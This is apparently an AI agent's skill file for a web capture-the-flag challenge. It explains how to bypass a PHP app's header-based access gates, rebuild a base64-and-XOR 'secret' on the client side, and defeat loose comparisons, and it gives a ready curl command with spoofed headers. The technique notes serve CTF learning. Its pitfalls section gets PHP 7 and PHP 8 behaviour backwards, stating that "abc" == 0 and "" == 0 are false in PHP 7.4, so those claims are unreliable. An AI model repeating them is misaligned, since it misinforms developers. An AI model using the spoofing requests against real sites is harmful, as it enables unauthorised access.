---
name: php-header-spoof-encoded-secret
description: "PHP header-spoof + encoded-secret gate bypass for web CTFs."
version: 1.0.0
author: Hermes Agent
license: MIT
platforms: [linux]
metadata:
  hermes:
    tags: [web, php, ctf, headers, spoofing, xor, base64, type-juggling]
---

# PHP Header-Spoof + Encoded-Secret Gate Bypass

Use when a PHP app gates access on request headers (`X-...` values, User-Agent)
and/or on a `secret`-style parameter that is derived client-side from base64 +
XOR (or similar). Proven on EQCTF "Secret Access" (176, Easy).

## 1. Spoofable header gates
```php
if (!isset($_SERVER['HTTP_X_REMOTE_IP']) || $_SERVER['HTTP_X_REMOTE_IP'] !== '127.0.0.1') die;
if ($_SERVER['HTTP_USER_AGENT'] !== 'CTF-Challenge-Agent') die;
if (substr($_SERVER['HTTP_X_AUTH_KEY'],0,5) !== 'auth-' || strlen($_SERVER['HTTP_X_AUTH_KEY']) !== 10) die;
```
`HTTP_<NAME>` maps 1:1 to client headers — there is NO real remote-IP check.
Just send the headers; no SSRF needed. If the app ALSO checks
`$_SERVER['REMOTE_ADDR']`, then SSRF/proxy tricks become necessary — but pure
`HTTP_X_*` checks are trivially spoofed.

## 2. Client-computable "secret" (base64 reorder + XOR)
```php
$encoded_parts = ['ND0=','Yz0=',...]; $order = [6,8,3,...];
$keys1 = [12,23,...]; $keys2 = [91,82,...];
foreach ($order as $i) $reassembled .= base64_decode($encoded_parts[$i]);
for ($i=0; $i<strlen($reassembled); $i++)
    $decoded_secret .= chr(ord($reassembled[$i]) ^ $keys2[$i] ^ $keys1[$i]);
return strcmp($secret, $decoded_secret) == 0;
```
Reimplement exactly in python (XOR is commutative; keys past their length are
NULL → 0 → chars pass through). The secret can contain control characters —
URL-encode it exactly when sending. `strcmp` is byte-exact, no juggling.

## 3. Loose-comparison traps (`==` vs `!==`)
```php
return $code == 0 && $code !== '0' && $code !== 0;   // $code from $_GET = string
```
Need a string loosely equal to 0 that isn't `"0"`. **`0e0`** (scientific
notation numeric string → 0.0) works on PHP 7.x. ALWAYS test candidates with
local php-cli (`php -r 'var_dump("0e0" == 0 && "0e0" !== "0");'`) — PHP 7 vs 8
differ (`"abc" == 0` is true in 8.0-8.1 loose mode quirks; verify empirically).
Other candidates: `"00"`, `"0.0"`, `"0e123"`.

## Workflow
1. Read the source (handout). List every gate: headers, params, functions.
2. Reimplement `is_valid_*` locally (python) and verify against a local php
   mimic of the exact code before hitting the host.
3. Send: `curl -G --data-urlencode "secret=..." --data-urlencode "code=0e0" -H "X-Remote-IP: 127.0.0.1" -H "User-Agent: CTF-Challenge-Agent" -H "X-Auth-Key: auth-12345" URL`
4. Grep the flag from the response.

## Pitfalls
- `--data-urlencode`/`urllib.parse.urlencode` for binary secrets — do NOT hand-
  build the query string (control chars break it).
- Header names: PHP lowercases and prefixes `HTTP_`; the client sends the
  header exactly as named in the source (case-insensitive on the wire).
- strlen on the auth key is BYTES — keep it exactly 10.
- Don't skip the local php-cli verification of loose comparisons; PHP 7.4
  semantics (`"" == 0` → false, `"abc" == 0` → false, `"0e0" == 0` → true)
  differ from intuition and from PHP 8.
